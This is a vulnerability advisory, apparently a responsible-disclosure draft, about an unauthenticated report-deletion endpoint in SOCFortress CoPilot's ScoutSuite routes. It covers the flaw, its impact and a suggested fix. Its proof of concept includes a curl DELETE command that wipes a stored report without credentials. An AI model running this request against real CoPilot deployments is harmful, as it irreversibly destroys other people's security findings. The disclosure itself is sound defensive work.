# CVE-PENDING: SOCFortress CoPilot — Unauthenticated ScoutSuite Report Deletion

> **Status:** Disclosed to maintainers · Awaiting CVE assignment  
> **Severity:** High (CVSS 3.1: ~7.5)  
> **Verified:** 2026-04-21  
> **Affected project:** [socfortress/CoPilot](https://github.com/socfortress/CoPilot)

---

## Summary

Every endpoint under `/api/scoutsuite/*` in the CoPilot backend requires **zero authentication**. The `DELETE /api/scoutsuite/delete-report/{report_name}` endpoint allows any unauthenticated network-adjacent attacker to permanently delete stored ScoutSuite cloud-security reports without credentials.

A secondary upload path-traversal was also investigated — the upload endpoint has been patched with `os.path.basename()`, but the deletion endpoint remains unprotected.

---

## Affected Component

| Field | Value |
|---|---|
| Repository | `socfortress/CoPilot` |
| File | `backend/app/integrations/scoutsuite/routes/scoutsuite.py` |
| Endpoint | `DELETE /api/scoutsuite/delete-report/{report_name}` |
| Auth required | ❌ None |

---

## Vulnerability Details

```python
@integration_scoutsuite_router.delete("/delete-report/{report_name}")
async def delete_report(report_name: str):   # <-- no auth dependency injected
    report_file_path = f"scoutsuite-report/{report_name}"
    ...
    os.remove(file_path)
```

The router registers the endpoint without any `Depends(verify_token)` or equivalent FastAPI dependency. All other sensitive CoPilot endpoints use an authentication dependency — this one was missed.

---

## Impact

An unauthenticated attacker with network access to the CoPilot backend (default: port 5000) can:

1. Enumerate report filenames via other unauthenticated ScoutSuite endpoints
2. Issue DELETE requests for each report
3. Permanently destroy all stored cloud-security findings (HTML reports, results JS, exceptions files)

No account, token, or prior access is required. The deletion is immediate and irreversible (no recycle bin or soft-delete).

---

## Proof of Concept

See [`03_scoutsuite_path_traversal.py`](./03_scoutsuite_path_traversal.py).

### Quick reproduction (no Python required)

```bash
# 1. Seed a report file
docker exec copilot-main-copilot-backend-1 sh -c "echo test > scoutsuite-report/POC_DELETE_ME.html"

# 2. Delete it — no token needed
curl -sk -X DELETE http://localhost:5000/api/scoutsuite/delete-report/POC_DELETE_ME.html

# 3. Confirm deletion
docker exec copilot-main-copilot-backend-1 ls scoutsuite-report/
```

**Expected result:** Step 2 returns HTTP 200; step 3 shows the file is gone.

---

## Suggested Fix

Add the existing CoPilot auth dependency to the endpoint:

```python
from app.auth.utils import AuthHandler

@integration_scoutsuite_router.delete("/delete-report/{report_name}")
async def delete_report(
    report_name: str,
    auth_handler: AuthHandler = Security(get_current_user),  # add this
):
    ...
```

The exact dependency name may vary — match whatever pattern is used on other protected routes in the same router file.

---

## Disclosure Timeline

| Date | Event |
|---|---|
| 2026-04-21 | Vulnerability discovered and verified |
| 2026-04-21 | GitHub Security Advisory submitted |
| TBD | Maintainer response |
| TBD | Patch released |
| TBD | Public disclosure |

---

## Ethics

This research was conducted on a self-hosted test instance. Run only against systems you own or have **written authorization** to test.
